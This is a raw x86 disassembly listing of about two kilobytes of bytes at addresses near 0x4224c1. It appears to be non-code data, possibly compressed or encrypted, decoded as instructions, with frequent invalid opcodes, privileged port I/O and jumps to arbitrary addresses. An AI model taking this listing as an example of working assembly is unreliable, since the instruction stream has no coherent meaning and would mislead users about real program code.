  4224c1:	out    dx,eax
  4224c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4224c3:	add    DWORD PTR [esp+esi*2+0x3a],esi
  4224c7:	int3   
  4224c8:	mov    WORD PTR ds:0x4920f58c,ds
  4224ce:	push   ebx
  4224cf:	jg     0x422529
  4224d1:	les    edx,FWORD PTR [ebx]
  4224d3:	loope  0x4224f5
  4224d5:	or     edi,esi
  4224d7:	mov    esi,esi
  4224d9:	fisttp WORD PTR [ebx]
  4224db:	imul   DWORD PTR [edx+0x65]
  4224de:	push   ds
  4224df:	aam    0x90
  4224e1:	out    0xca,al
  4224e3:	mov    ebx,0x7b9352f0
  4224e8:	xchg   ecx,eax
  4224e9:	add    al,0x99
  4224eb:	fldcw  WORD PTR [ebp+0xb]
  4224ee:	mov    dl,0x9f
  4224f0:	mov    eax,edi
  4224f2:	pusha  
  4224f3:	add    DWORD PTR [ecx],edx
  4224f5:	push   cs
  4224f6:	loopne 0x422503
  4224f8:	cld    
  4224f9:	cmovb  eax,edx
  4224fc:	gs iret 
  4224fe:	and    BYTE PTR [edi-0x33],0xa8
  422502:	dec    esi
  422503:	in     eax,0x9d
  422505:	cwde   
  422506:	pop    edx
  422507:	shl    BYTE PTR [edi*2-0x48d3406f],cl
  42250e:	cmc    
  42250f:	aad    0x2
  422511:	sbb    esi,DWORD PTR [esi+0x6d]
  422514:	dec    esi
  422515:	adc    DWORD PTR [ecx-0x3bd74181],edx
  42251b:	push   0x6c
  42251d:	popf   
  42251e:	adc    al,0xc5
  422520:	xchg   dh,bh
  422522:	mov    bh,0x3f
  422524:	repz jmp 0xba266e28
  42252a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42252b:	ja     0x42259d
  42252d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42252e:	xlat   BYTE PTR ds:[ebx]
  42252f:	inc    eax
  422530:	cmp    al,0xa2
  422532:	fistp  DWORD PTR [eax+0x2269d7be]
  422538:	mov    DWORD PTR [edi+0x2afd3121],0x34f6e93f
  422542:	mov    ch,BYTE PTR [eax-0x50]
  422545:	adc    ebp,DWORD PTR [eax+0x55eecd8]
  42254b:	(bad)  
  42254c:	and    BYTE PTR [eax-0xd],bl
  42254f:	xchg   edi,eax
  422550:	or     ch,BYTE PTR ds:0x88389c27
  422556:	(bad)  
  422557:	mov    es,WORD PTR [ebx+0x49]
  42255a:	xor    esi,DWORD PTR [ebx-0x56949e63]
  422560:	fisub  WORD PTR [edi+0x7c86f5c4]
  422566:	push   0x45
  422568:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422569:	rol    BYTE PTR [ecx-0x655f31ed],cl
  42256f:	mov    bh,0x90
  422571:	or     DWORD PTR [esi],eax
  422573:	arpl   WORD PTR [eax-0x10a92f8c],dx
  422579:	inc    edx
  42257a:	sar    BYTE PTR [ebx-0x32d5ccec],1
  422580:	dec    esi
  422581:	std    
  422582:	cmp    BYTE PTR [esi],0x7a
  422585:	sbb    BYTE PTR [ecx],bl
  422587:	sub    eax,DWORD PTR [eax+0x5eaadf2f]
  42258d:	bound  ebx,QWORD PTR [esp+ebp*2-0x177aee81]
  422594:	sti    
  422595:	xchg   BYTE PTR ds:0xbf96bfdb,al
  42259b:	aas    
  42259c:	jge    0x4225bc
  42259e:	stos   BYTE PTR es:[edi],al
  42259f:	cdq    
  4225a0:	cli    
  4225a1:	jl     0x422605
  4225a3:	or     ebp,edx
  4225a5:	(bad)  
  4225a6:	fwait
  4225a7:	cmp    esp,ecx
  4225a9:	loopne 0x4225b3
  4225ab:	sbb    eax,0x6e5200c
  4225b0:	cwde   
  4225b1:	addr16 test al,0x7b
  4225b4:	sub    DWORD PTR [ebx+0x1f],esp
  4225b7:	inc    eax
  4225b8:	sub    esp,DWORD PTR [ebx-0x2df579e8]
  4225be:	retf   
  4225bf:	test   BYTE PTR [edi],al
  4225c1:	inc    esi
  4225c2:	inc    esp
  4225c3:	adc    esp,DWORD PTR [eax-0x64159ad3]
  4225c9:	(bad)  
  4225ca:	mov    bh,0x7
  4225cc:	add    DWORD PTR [ebx-0xe],ebp
  4225cf:	arpl   WORD PTR [ecx],cx
  4225d1:	scas   eax,DWORD PTR es:[edi]
  4225d2:	or     cl,ah
  4225d4:	fimul  WORD PTR [ecx+0x220f874c]
  4225da:	test   BYTE PTR [edi-0x4eba6a1d],bh
  4225e0:	rol    BYTE PTR [ecx+0x120a0944],1
  4225e6:	xchg   edi,eax
  4225e7:	cwde   
  4225e8:	xchg   esp,eax
  4225e9:	outs   dx,DWORD PTR ds:[esi]
  4225ea:	pop    edi
  4225eb:	mov    al,ds:0x113bb5d6
  4225f0:	jg     0x422599
  4225f2:	inc    edx
  4225f3:	scas   eax,DWORD PTR es:[edi]
  4225f4:	daa    
  4225f5:	fmul   QWORD PTR [edx-0x49]
  4225f8:	dec    ecx
  4225f9:	arpl   WORD PTR [eax+0x6dfe5125],di
  4225ff:	ret    
  422600:	push   ebp
  422601:	test   al,0x33
  422603:	rcr    BYTE PTR ds:0xf7d0882,1
  422609:	test   DWORD PTR [eax+0x63],0xd0f93db0
  422610:	or     BYTE PTR [ecx-0x718a68c0],0xbf
  422617:	dec    esp
  422618:	sbb    al,0xa2
  42261a:	loopne 0x4225e6
  42261c:	pop    ss
  42261d:	idiv   BYTE PTR [ebx]
  42261f:	sub    dl,BYTE PTR [edx]
  422621:	pop    es
  422622:	inc    ecx
  422623:	(bad)  
  422624:	rcl    bh,1
  422626:	inc    ecx
  422627:	sbb    al,0x3c
  422629:	loope  0x4225ef
  42262b:	test   eax,0x6618bb88
  422630:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422631:	xor    DWORD PTR [edx],edi
  422633:	stc    
  422634:	xlat   BYTE PTR ds:[ebx]
  422635:	jns    0x422668
  422637:	js     0x422659
  422639:	stc    
  42263a:	mov    WORD PTR [edx-0x5bbc503b],?
  422640:	sub    edi,DWORD PTR [esi]
  422642:	jmp    0x4226ae
  422644:	mov    eax,DWORD PTR [edx+0x5b]
  422647:	jmp    0xceb8eb87
  42264c:	ror    al,cl
  42264e:	pop    ebx
  42264f:	dec    esp
  422650:	or     DWORD PTR [eax+0x40],esp
  422653:	sub    BYTE PTR [ebx+0x1a],cl
  422656:	lds    ebp,FWORD PTR [esi]
  422658:	pop    esp
  422659:	pop    ebp
  42265a:	inc    ebp
  42265b:	imul   ebx,DWORD PTR [ebx],0x9fa0777f
  422661:	dec    edi
  422662:	xchg   esp,eax
  422663:	mov    ds:0xf37dea76,eax
  422668:	ss add edx,0x32
  42266c:	hlt    
  42266d:	(bad)  
  42266e:	test   al,0x8
  422670:	loope  0x42263e
  422672:	ja     0x422619
  422674:	ja     0x4226d4
  422676:	dec    eax
  422677:	push   edx
  422678:	sar    cl,cl
  42267a:	jne    0x4226e9
  42267c:	inc    esp
  42267d:	mov    edi,DWORD PTR [eax-0x42]
  422680:	test   eax,0x64677148
  422685:	add    BYTE PTR [ebx+ebp*2+0x6ff2b16f],0x20
  42268d:	and    BYTE PTR [ecx+0x1b17976f],ch
  422693:	mov    esp,0xa7d4ed7
  422698:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422699:	mov    ecx,0x8a466d87
  42269e:	xlat   BYTE PTR ds:[ebx]
  42269f:	mov    eax,DWORD PTR [eax-0x10]
  4226a2:	or     esi,DWORD PTR [eax+esi*8]
  4226a5:	pop    ecx
  4226a6:	(bad)  
  4226a7:	jmp    0x6609:0x61c1b0a
  4226ae:	fadd   DWORD PTR ds:0xa319da0
  4226b4:	call   0x53116d57
  4226b9:	lods   eax,DWORD PTR ds:[esi]
  4226ba:	inc    edi
  4226bb:	js     0x422713
  4226bd:	xor    al,0x97
  4226bf:	add    eax,0x77c061fd
  4226c4:	ds nop
  4226c6:	ror    dl,0x44
  4226c9:	ret    
  4226ca:	add    dl,BYTE PTR [edi+0x6b9bcc00]
  4226d0:	sub    bl,BYTE PTR [ebx-0x60]
  4226d3:	out    dx,al
  4226d4:	ret    0xb10e
  4226d7:	xchg   edi,eax
  4226d8:	sub    ch,dh
  4226da:	sub    eax,0x5ee5e9b
  4226df:	enter  0x8a1c,0x6
  4226e3:	push   ebx
  4226e4:	xchg   esi,eax
  4226e5:	jl     0x422759
  4226e7:	adc    BYTE PTR ds:0x8186364f,bl
  4226ed:	adc    ebx,DWORD PTR [edi+0x15]
  4226f0:	sgdtd  [ecx+0x5e1b3d35]
  4226f7:	test   eax,0xd1e6d231
  4226fc:	adc    al,0xcf
  4226fe:	adc    edi,ebx
  422700:	add    ecx,DWORD PTR [ebx+0xe]
  422703:	(bad)  [ecx-0x17]
  422706:	fstp   QWORD PTR [eax+0x42]
  422709:	push   edx
  42270a:	or     dl,BYTE PTR [edx]
  42270c:	xor    al,0x54
  42270e:	mov    edi,0xb06fb1b4
  422713:	mov    dh,BYTE PTR [esp+ecx*8+0x78]
  422717:	cmp    DWORD PTR ds:[eax],esp
  42271a:	xchg   esi,eax
  42271b:	cmp    eax,0x4fc149c6
  422720:	aam    0x69
  422722:	add    eax,0x8e055728
  422727:	outs   dx,BYTE PTR ds:[esi]
  422728:	xchg   ecx,eax
  422729:	lds    esp,FWORD PTR [esi]
  42272b:	add    BYTE PTR [eax-0x45],al
  42272e:	push   0xffffffb6
  422730:	sti    
  422731:	jbe    0x4227b2
  422733:	stos   BYTE PTR es:[edi],al
  422734:	and    al,0x81
  422736:	(bad)  
  422737:	mov    ds:0x4d62b38a,al
  42273c:	xor    eax,0x39f828fb
  422741:	call   0xb50770cf
  422746:	xchg   esp,eax
  422747:	fs dec ecx
  422749:	push   0x12
  42274b:	cld    
  42274c:	in     al,dx
  42274d:	aas    
  42274e:	pop    ebp
  42274f:	pusha  
  422750:	js     0x42276b
  422752:	aaa    
  422753:	or     eax,0x834edcbb
  422758:	int3   
  422759:	js     0x422710
  42275b:	in     eax,dx
  42275c:	arpl   WORD PTR [eax-0x3c],ax
  42275f:	scas   al,BYTE PTR es:[edi]
  422760:	(bad)  
  422762:	fdivr  DWORD PTR [esi-0x127fae93]
  422768:	xor    al,0x47
  42276a:	push   cs
  42276b:	adc    DWORD PTR [edx+0x6e],ebp
  42276e:	scas   eax,DWORD PTR es:[edi]
  42276f:	mov    al,ds:0x84e46961
  422774:	xchg   ecx,eax
  422775:	or     esp,ebp
  422777:	ret    0x85f9
  42277a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42277b:	inc    ebx
  42277c:	shl    bl,0xa1
  42277f:	ret    
  422780:	out    dx,al
  422781:	out    0xd1,al
  422783:	xchg   ebp,eax
  422784:	sub    ch,al
  422786:	mov    DWORD PTR [eax+eax*4+0x3],esi
  42278a:	mov    eax,0xc70d1148
  42278f:	mov    esi,ecx
  422791:	imul   eax
  422793:	fisttp DWORD PTR [edx+eiz*1+0x4b]
  422797:	inc    ebp
  422798:	daa    
  422799:	push   cs
  42279a:	mov    bl,0xea
  42279c:	add    eax,0x623dedb9
  4227a1:	outs   dx,DWORD PTR ds:[esi]
  4227a2:	mov    ebp,0xa6b5f6e0
  4227a7:	xchg   esp,eax
  4227a8:	test   eax,0xf6ea5dd2
  4227ad:	ins    DWORD PTR es:[edi],dx
  4227ae:	adc    eax,0xef5bddc3
  4227b3:	test   dh,bh
  4227b5:	jmp    0x4227f1
  4227b7:	and    BYTE PTR es:[eax+0x5562c0ef],bl
  4227be:	int3   
  4227bf:	pop    ebp
  4227c0:	call   FWORD PTR [eax-0x452d1fb5]
  4227c6:	data16 int 0xf3
  4227c9:	push   ecx
  4227ca:	push   0x7f36f25
  4227cf:	pop    ebp
  4227d0:	cwde   
  4227d1:	fldenv ds:0xba1db683
  4227d7:	fdiv   QWORD PTR [edx+0x3cdd2043]
  4227dd:	or     al,0xa7
  4227df:	ficom  WORD PTR [edx+0x6b]
  4227e2:	cld    
  4227e3:	iret   
  4227e4:	cmp    eax,0xfab240f0
  4227e9:	xchg   ecx,eax
  4227ea:	jae    0x4227ae
  4227ec:	adc    cl,BYTE PTR cs:[edi+0x1cf61c40]
  4227f3:	imul   ebp,DWORD PTR [ebx+eiz*1],0xffffffc7
  4227f7:	mov    cl,0x84
  4227f9:	sbb    eax,0x4ae222af
  4227fe:	pop    ebp
  4227ff:	retf   
  422800:	mov    ds:0xf5fdb1ac,al
  422805:	and    esp,DWORD PTR [esi-0x39678bfd]
  42280b:	pop    es
  42280c:	lds    ebp,FWORD PTR [ebx-0x2d9bf6de]
  422812:	mov    ecx,0xbff91f74
  422817:	push   eax
  422818:	ins    BYTE PTR es:[edi],dx
  422819:	pop    ebx
  42281a:	mov    ecx,0x167e5914
  42281f:	cmp    al,0xfb
  422821:	sbb    DWORD PTR [ebx+0x57a06faa],edx
  422827:	sub    BYTE PTR [bx+0x623e],0x50
  42282d:	adc    eax,ecx
  42282f:	inc    eax
  422830:	jnp    0x4227e3
  422832:	out    dx,eax
  422833:	adc    esp,DWORD PTR [edi-0x68ccda21]
  422839:	mov    edi,0xfb9b896b
  42283e:	ficomp WORD PTR [ebp+0x6a]
  422841:	mov    ds:0x5c04d1f9,eax
  422846:	jns    0x42287a
  422848:	outs   dx,DWORD PTR ds:[esi]
  422849:	mov    ah,0xd7
  42284b:	push   ds
  42284c:	fstp   st(0)
  42284e:	int    0x2f
  422850:	or     BYTE PTR [ebx],bh
  422852:	mov    al,dl
  422854:	pop    ebp
  422855:	and    eax,0x85c97917
  42285a:	icebp  
  42285b:	sbb    al,0xdc
  42285d:	sub    BYTE PTR [edi+edi*8-0x16224d2b],bh
  422864:	and    DWORD PTR [edx+ebx*4],ecx
  422867:	(bad)  
  422868:	xchg   edi,eax
  422869:	popa   
  42286a:	jbe    0x42281c
  42286c:	fild   DWORD PTR [edi+0x23b78021]
  422872:	dec    edx
  422873:	pop    ds
  422874:	daa    
  422875:	pop    eax
  422876:	test   al,0xb2
  422878:	push   0x1a1f4d3
  42287d:	div    al
  42287f:	loopne 0x422850
  422881:	hlt    
  422882:	ret    
  422883:	jp     0x42281a
  422885:	push   ds
  422886:	ror    BYTE PTR [ebx+eiz*4],0xee
  42288a:	bound  ebx,QWORD PTR [ebx]
  42288c:	loopne 0x422869
  42288e:	ds in  eax,0x5b
  422891:	inc    esp
  422892:	mov    esp,0xb9a467ce
  422897:	jo     0x422912
  422899:	inc    ebx
  42289a:	retf   0x7b96
  42289d:	shl    DWORD PTR ds:0x53c7a718,0x62
  4228a4:	repnz or eax,0xa8331fb1
  4228aa:	in     al,0xd3
  4228ac:	arpl   WORD PTR ds:0xbbcfac2b,cx
  4228b2:	aad    0x6a
  4228b4:	gs leave 
  4228b6:	push   ebp
  4228b7:	jmp    0x4228fc
  4228b9:	arpl   WORD PTR [edi-0x54],bp
  4228bc:	stc    
  4228bd:	rol    BYTE PTR [esi+0x4fbbee47],0x6a
  4228c4:	xchg   ebp,eax
  4228c5:	push   ebx
  4228c6:	outs   dx,DWORD PTR ds:[esi]
  4228c7:	pop    es
  4228c8:	push   0xffffffe6
  4228ca:	pop    esi
  4228cb:	shl    esp,cl
  4228cd:	and    ebp,0x18
  4228d0:	jmp    0x422924
  4228d2:	mov    edi,0xd8cc0f5b
  4228d7:	std    
  4228d8:	adc    BYTE PTR [ecx-0x24676d17],al
  4228de:	dec    esp
  4228df:	das    
  4228e0:	repz mov ch,0x93
  4228e3:	jo     0x42287e
  4228e5:	or     eax,0xae0f948a
  4228ea:	push   edi
  4228eb:	push   ebp
  4228ec:	inc    ecx
  4228ed:	cld    
  4228ee:	or     dl,dl
  4228f0:	mov    ebx,0x4892f3b
  4228f5:	or     DWORD PTR cs:[esi-0x4917175b],0x11
  4228fd:	ret    0x4710
  422900:	push   0x4c
  422902:	ret    0x7f15
  422905:	push   eax
  422906:	loopne 0x4228d1
  422908:	mov    ds:0x6f7821e6,eax
  42290d:	dec    ebx
  42290e:	ror    BYTE PTR [esi+0x11],cl
  422911:	ins    BYTE PTR es:[edi],dx
  422912:	dec    ebp
  422913:	xor    ah,BYTE PTR [edx]
  422915:	mov    bh,0x70
  422917:	dec    eax
  422918:	xor    DWORD PTR [esp+ebp*4-0x5d2c2809],ebx
  42291f:	mov    ebx,0x341633bb
  422924:	daa    
  422925:	in     eax,dx
  422926:	icebp  
  422927:	xchg   DWORD PTR [esi-0x503b9753],edx
  42292d:	stos   BYTE PTR es:[edi],al
  42292e:	out    dx,eax
  42292f:	xchg   esi,eax
  422930:	pop    ss
  422931:	(bad)  
  422932:	or     al,0xbb
  422934:	(bad)  
  422935:	es int3 
  422937:	xor    eax,0x2a80f98a
  42293c:	mov    bh,0x88
  42293e:	adc    bl,cl
  422940:	or     bh,ch
  422942:	pop    ebx
  422943:	out    0x6c,eax
  422945:	add    ah,al
  422947:	jl     0x422986
  422949:	sbb    eax,0x460e51b9
  42294e:	fidivr DWORD PTR [edx*2-0x57046d7e]
  422955:	mov    bh,BYTE PTR [edx+ebp*2+0x5c]
  422959:	fdivr  QWORD PTR ds:0xa138ddd5
  42295f:	repz xlat BYTE PTR ds:[ebx]
  422961:	test   al,0x10
  422963:	pop    DWORD PTR [ebx+0x51]
  422966:	idiv   BYTE PTR [edx-0x4e08b5b8]
  42296c:	dec    esp
  42296d:	cli    
  42296e:	pop    es
  42296f:	add    eax,0x614c65fe
  422974:	sbb    DWORD PTR [esi],eax
  422976:	inc    ebx
  422977:	rcl    cl,cl
  422979:	js     0x4229af
  42297b:	add    al,0x5c
  42297d:	popf   
  42297e:	cmp    bl,al
  422980:	pop    edx
  422981:	imul   eax,DWORD PTR [eax+0x1],0x558f3c1e
  422988:	push   edx
  422989:	inc    edx
  42298a:	dec    esi
  42298b:	and    esi,DWORD PTR [edx+edx*1+0x36]
  42298f:	jae    0x4229ce
  422991:	adc    DWORD PTR [edi],0x327f0c55
  422997:	mov    eax,DWORD PTR [edx]
  422999:	inc    esi
  42299b:	int    0xc
  42299d:	cmp    bl,0x11
  4229a0:	jecxz  0x42296f
  4229a2:	adc    eax,esp
  4229a4:	aaa    
  4229a5:	and    eax,0xff0f1c0d
  4229aa:	mov    ecx,0xbcef17f
  4229af:	push   eax
  4229b0:	test   al,0xfe
  4229b2:	add    dh,BYTE PTR ds:0xe732eae1
  4229b8:	rcr    BYTE PTR [esi+edi*2+0xa],0xfe
  4229bd:	xchg   DWORD PTR [ecx+0x2],ebx
  4229c0:	retf   
  4229c1:	pop    ebx
  4229c2:	call   0x398c33a1
  4229c7:	rcr    BYTE PTR [edx+eax*2+0x3c5820df],0x98
  4229cf:	pop    ecx
  4229d0:	inc    eax
  4229d1:	paddq  mm0,QWORD PTR ds:0x11ff0f3c
  4229d8:	inc    edi
  4229d9:	(bad)  
  4229da:	frstor [edi]
  4229dc:	call   0xa9c57a43
  4229e1:	push   0xcd3f984d
  4229e6:	pop    eax
  4229e7:	(bad)  
  4229e8:	mov    esi,DWORD PTR [esi]
  4229ea:	jle    0x422a04
  4229ec:	cmp    al,0xab
  4229ee:	mov    esp,0x9515e931
  4229f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4229f4:	pop    ecx
  4229f5:	pop    ax
  4229f7:	xchg   ebx,eax
  4229f8:	hlt    
  4229f9:	or     ah,BYTE PTR [esi+0x24921abf]
  4229ff:	dec    ebp
  422a00:	cmp    DWORD PTR [edi+0x10],ebx
  422a03:	fwait
  422a04:	jne    0x4229a8
  422a06:	cmp    DWORD PTR [ebx+eiz*8+0x2c02d92d],ebx
  422a0d:	pop    es
  422a0e:	(bad)  
  422a0f:	idiv   BYTE PTR [ebx+edx*1-0x6f]
  422a13:	in     eax,dx
  422a14:	jns    0x422a2d
  422a16:	ins    BYTE PTR es:[edi],dx
  422a17:	mov    eax,0xcdad2080
  422a1c:	call   0x33ae:0xff9d729
  422a23:	push   cs
  422a24:	inc    eax
  422a25:	xor    BYTE PTR [ecx+0x5997c9f7],bh
  422a2b:	fcom   QWORD PTR [esi+0xc27339]
  422a31:	cmp    edi,DWORD PTR [esi-0x6a98862f]
  422a37:	xor    BYTE PTR [ebp+0x667f9846],ah
  422a3d:	aas    
  422a3e:	lods   eax,DWORD PTR ds:[esi]
  422a3f:	cld    
  422a40:	mov    al,0xf3
  422a42:	mov    ds:0x8522e194,eax
  422a47:	xchg   ebp,eax
  422a48:	dec    ebp
  422a49:	ret    0xd08f
  422a4c:	mov    ?,WORD PTR [ecx-0x79]
  422a4f:	inc    ebx
  422a50:	das    
  422a51:	call   0xaa91:0xe971dab6
  422a58:	fidiv  DWORD PTR [esi]
  422a5a:	or     DWORD PTR [ecx+eiz*2+0x8],esi
  422a5e:	sbb    eax,0xea5b130b
  422a63:	int3   
  422a64:	jle    0x422aab
  422a66:	dec    esi
  422a67:	jle    0x422abb
  422a69:	aas    
  422a6a:	push   esi
  422a6b:	shr    BYTE PTR [eax+0x53],1
  422a6e:	fcmovbe st,st(7)
  422a70:	mov    BYTE PTR [ebx],bh
  422a72:	mov    fs,ebx
  422a74:	xchg   esi,eax
  422a75:	inc    edi
  422a76:	add    al,0xbf
  422a78:	mov    ebp,0xf005a051
  422a7d:	ss cwde 
  422a7f:	test   esi,ebp
  422a81:	je     0x422a3e
  422a83:	je     0x422a13
  422a85:	scas   eax,DWORD PTR es:[edi]
  422a86:	sbb    al,0xd
  422a88:	mov    ah,0xa1
  422a8a:	cwde   
  422a8b:	mov    ?,WORD PTR [ebx-0x4baee6d8]
  422a91:	stc    
  422a92:	adc    ah,BYTE PTR ds:0x56a100d2
  422a98:	and    al,0xd5
  422a9a:	(bad)  
  422a9b:	xor    ebx,ecx
  422a9d:	in     al,0xf4
  422a9f:	mov    cl,0x15
  422aa1:	sbb    BYTE PTR [edx+esi*4+0x131732d7],dl
  422aa8:	push   edi
  422aa9:	and    eax,0x43f75c05
  422aae:	imul   edi,esi,0xffffffc3
  422ab1:	cmp    al,bl
  422ab3:	outs   dx,BYTE PTR ds:[esi]
  422ab4:	jmp    0xcfd1ef2a
  422ab9:	mov    esi,0xcf3036b0
  422abe:	test   BYTE PTR [edx-0x3a],bl
  422ac1:	ror    BYTE PTR ds:0x6e40a8ca,1
  422ac7:	imul   DWORD PTR [ebx+0x7f]
  422aca:	retf   
  422acb:	iret   
  422acc:	mov    eax,ds:0x7dd31e08
  422ad1:	cmp    eax,DWORD PTR [ebp-0xc]
  422ad4:	nop
  422ad5:	int    0xbd
  422ad7:	test   eax,0xd78f7812
  422adc:	aas    
  422add:	aam    0x93
  422adf:	out    dx,eax
  422ae0:	out    0x79,al
  422ae2:	ja     0x422b0c
  422ae4:	push   0x85e5962
  422ae9:	in     al,0x40
  422aeb:	out    dx,eax
  422aec:	loopne 0x422b26
  422aee:	leave  
  422aef:	out    0xe0,eax
  422af1:	fs push es
  422af3:	pop    ds
  422af4:	rol    DWORD PTR [esi+0x48ed3f3d],1
  422afa:	jo     0x422a85
  422afc:	(bad)  
  422afe:	add    al,0x65
  422b00:	push   edi
  422b01:	sub    eax,DWORD PTR [edx+0x236e629c]
  422b07:	inc    edi
  422b08:	mov    esi,0xe767a82f
  422b0d:	cs dec esi
  422b0f:	iret   
  422b10:	adc    al,0xda
  422b12:	push   ecx
  422b13:	dec    ebp
  422b14:	into   
  422b15:	cdq    
  422b16:	retf   
  422b17:	(bad)  
  422b19:	xchg   esi,eax
  422b1a:	push   esp
  422b1b:	mov    edi,0x18effd
  422b20:	sbb    ebp,DWORD PTR [ebp+0x1b]
  422b23:	jnp    0x422b8a
  422b25:	mov    ds:0x588c3a38,eax
  422b2a:	enter  0x2287,0x79
  422b2e:	sub    al,0x9c
  422b30:	sar    DWORD PTR [edx+0x27],cl
  422b33:	or     al,0x92
  422b35:	fidiv  DWORD PTR [esp+ebp*4]
  422b38:	bound  eax,QWORD PTR [ebp-0x34d4617a]
  422b3e:	dec    edi
  422b3f:	call   0x3b9e235f
  422b44:	mov    DWORD PTR [eax-0x29],ebx
  422b47:	das    
  422b48:	add    BYTE PTR [ecx+0x7593dc3b],al
  422b4e:	clc    
  422b4f:	aad    0x39
  422b51:	mov    al,0xac
  422b53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422b54:	mov    ah,0x64
  422b56:	das    
  422b57:	cmp    eax,0xc50fbbd4
  422b5c:	mov    ah,0xaa
  422b5e:	daa    
  422b5f:	mov    bh,0x59
  422b61:	mov    ecx,0xbaf0dff0
  422b66:	xor    cl,BYTE PTR [esi]
  422b68:	xor    BYTE PTR [ebx+esi*2+0x5],ch
  422b6c:	es test edx,ebx
  422b6f:	addr16 mov edx,0x4f9e72b6
  422b75:	(bad)  
  422b76:	popa   
  422b77:	call   0x63c0:0x232f5ad3
  422b7e:	sub    al,0xb4
  422b80:	push   ecx
  422b81:	jl     0x422be4
  422b83:	sbb    BYTE PTR [eax+0x3c],cl
  422b86:	hlt    
  422b87:	jmp    0x8592b938
  422b8c:	ret    
  422b8d:	stos   DWORD PTR es:[edi],eax
  422b8e:	mov    ds:0x4aa78592,eax
  422b93:	jne    0x422bde
  422b95:	add    BYTE PTR [ecx-0x58],dl
  422b98:	jp     0x422bec
  422b9a:	popf   
  422b9b:	call   0x984:0x2f9a9998
  422ba2:	mov    dl,0x7e
  422ba4:	idiv   DWORD PTR [ebp+0x14]
  422ba7:	or     esp,edx
  422ba9:	adc    bl,BYTE PTR [edx]
  422bab:	pop    es
  422bac:	cwde   
  422bad:	int    0x42
  422baf:	test   al,0x66
  422bb1:	sbb    esi,DWORD PTR [edi]
  422bb3:	test   eax,0x9141d11c
  422bb8:	ja     0x422bb4
  422bba:	mov    eax,0xf8bd2817
  422bbf:	in     eax,0xf2
  422bc1:	mov    ch,0x1c
  422bc3:	mov    bl,0x13
  422bc5:	or     dl,ah
  422bc7:	inc    edi
  422bc8:	pop    ds
  422bc9:	loop   0x422ba4
  422bcb:	scas   eax,DWORD PTR es:[edi]
  422bcc:	push   ebx
  422bcd:	push   ds
  422bce:	add    eax,0xd60c2a1e
  422bd3:	push   0xffffffa2
  422bd5:	pop    es
  422bd6:	push   edi
  422bd8:	cwde   
  422bd9:	lods   eax,DWORD PTR ds:[esi]
  422bda:	daa    
  422bdb:	jbe    0x422c3e
  422bdd:	test   DWORD PTR [ecx],ecx
  422bdf:	ss aam 0xef
  422be2:	cld    
  422be3:	mov    BYTE PTR [edi-0x26655900],al
  422be9:	call   0xc3e9:0x58efd02a
  422bf0:	arpl   cx,dx
  422bf2:	mov    ds:0x6081e972,al
  422bf7:	(bad)  
  422bf8:	mul    al
  422bfa:	push   ebp
  422bfb:	xor    BYTE PTR [esi+0x49],al
  422bfe:	das    
  422bff:	xor    eax,0x665b60f0
  422c04:	xchg   ebx,eax
  422c05:	stos   DWORD PTR es:[edi],eax
  422c06:	in     eax,dx
  422c07:	clc    
  422c08:	and    ecx,DWORD PTR [edx]
  422c0a:	push   ss
  422c0b:	mov    ecx,0xd5d40930
  422c10:	test   eax,0x4ebb7624
  422c15:	sbb    DWORD PTR [edi+0x33f48c5f],0x63
  422c1c:	pop    ebx
  422c1d:	ret    0xb005
  422c20:	(bad)  
  422c21:	sar    BYTE PTR [ebx],1
  422c23:	adc    BYTE PTR [ebx+esi*2],al
  422c26:	xchg   edx,eax
  422c27:	lds    edx,FWORD PTR [eax]
  422c29:	inc    DWORD PTR [esi-0x3bef9e90]
  422c2f:	pop    esp
  422c30:	xor    dl,BYTE PTR [ebp+edi*4+0x43b081f3]
  422c37:	jl     0x422c6b
  422c39:	mov    ecx,0xae8892ac
  422c3e:	and    dh,0x4f
  422c41:	aam    0xb2
  422c43:	jl     0x422c4d
  422c45:	xchg   DWORD PTR [ecx-0x57781965],esp
  422c4b:	adc    BYTE PTR [esi],bl
  422c4d:	jo     0x422cb1
  422c4f:	retf   0x1c57
  422c52:	or     eax,esp
  422c54:	sub    BYTE PTR [esi-0x4c53b4cc],0x63
  422c5b:	mov    esp,esi
  422c5d:	cdq    
  422c5e:	jbe    0x422c3f
  422c60:	push   esi
  422c61:	jle    0x422bf1
  422c63:	retf   
  422c64:	dec    ecx
  422c65:	xor    al,0x15
  422c67:	les    esp,FWORD PTR ss:[edx+eax*4+0x51]
  422c6c:	mov    bh,0x22
  422c6e:	shr    BYTE PTR [edi-0xc59d06],cl
  422c74:	jae    0x422c10
  422c76:	shl    BYTE PTR [ecx],cl
  422c78:	sbb    DWORD PTR [ebx-0x6f4245ac],ecx
  422c7e:	inc    edi
  422c7f:	pusha  
  422c80:	add    al,0x7
  422c82:	push   esi
  422c83:	cmp    al,0xc5
  422c85:	cli    
  422c86:	sti    
  422c87:	inc    eax
  422c88:	in     al,dx
  422c89:	(bad)  
  422c8a:	icebp  
  422c8b:	dec    eax
  422c8c:	adc    DWORD PTR [eax-0x5025d0cd],ebp
  422c92:	not    DWORD PTR [edx+0x4ad8625e]
  422c98:	pusha  
  422c99:	cdq    
  422c9a:	jg     0x422c5e
  422c9c:	nop    DWORD PTR [ebp+eax*2+0x2b5843f1]
  422ca4:	or     eax,0x655f0fb2
  422ca9:	xchg   esp,eax
  422caa:	mov    edi,0xb523b268
  422caf:	mov    edi,0x5f290cdf
  422cb4:	add    eax,0x10f7c326
  422cb9:	sbb    cl,al
  422cbb:	fistp  WORD PTR [esi-0x25d0b6d5]
  422cc1:	int3   
  422cc2:	daa    
  422cc3:	inc    ebx
  422cc4:	dec    ecx
  422cc5:	retf   
  422cc6:	adc    esp,DWORD PTR [edx-0x77bc1050]
  422ccc:	ja     0x422c8f
  422cce:	popa   
  422ccf:	or     al,0x45
  422cd1:	mov    dl,0x5a
  422cd3:	in     eax,0x40
  422cd5:	xlat   BYTE PTR ds:[ebx]
  422cd6:	das    
  422cd7:	div    BYTE PTR [ebx-0x4c]
